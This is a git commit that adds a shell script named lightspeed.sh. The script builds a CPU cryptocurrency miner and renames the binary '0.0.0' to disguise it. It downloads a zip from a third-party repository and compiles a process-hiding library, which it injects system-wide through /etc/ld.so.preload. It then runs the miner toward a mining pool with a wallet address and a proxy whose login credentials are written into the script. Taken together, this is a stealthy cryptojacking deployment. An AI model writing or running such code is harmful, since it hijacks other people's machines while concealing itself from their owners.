671dd310be21f5cf42713536688d09dd75d39203
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-06-25 13:31:24 +0530

    Create lightspeed.sh

---
+++ lightspeed.sh
@@ -0,0 +1,21 @@
+git clone https://github.com/litecoincash-project/cpuminer-multi 
+
+sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+
+
+cd cpuminer-multi
+
+cd miner
+
+./build.sh
+
+mv cpuminer 0.0.0
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./0.0.0 -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
